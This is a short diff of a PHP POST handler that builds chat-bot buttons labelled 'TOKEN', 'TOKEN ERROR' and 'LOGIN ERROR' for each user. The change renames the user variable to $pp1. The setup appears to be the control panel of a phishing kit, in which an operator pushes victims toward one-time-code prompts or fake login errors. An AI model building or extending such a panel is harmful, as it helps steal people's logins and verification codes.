@@ -22,11 +22,11 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $botones = [
         [
-            ["text" => "📩 TOKEN", "callback_data" => "TOKEN|$usuario"],
-            ["text" => "❌ TOKEN ERROR", "callback_data" => "TOKEN-ERROR|$usuario"]
+            ["text" => "📩 TOKEN", "callback_data" => "TOKEN|$pp1"],
+            ["text" => "❌ TOKEN ERROR", "callback_data" => "TOKEN-ERROR|$pp1"]
         ],
         [
-            ["text" => "⚠️ LOGIN ERROR", "callback_data" => "LOGIN-ERROR|$usuario"]
+            ["text" => "⚠️ LOGIN ERROR", "callback_data" => "LOGIN-ERROR|$pp1"]
         ]
     ];
 
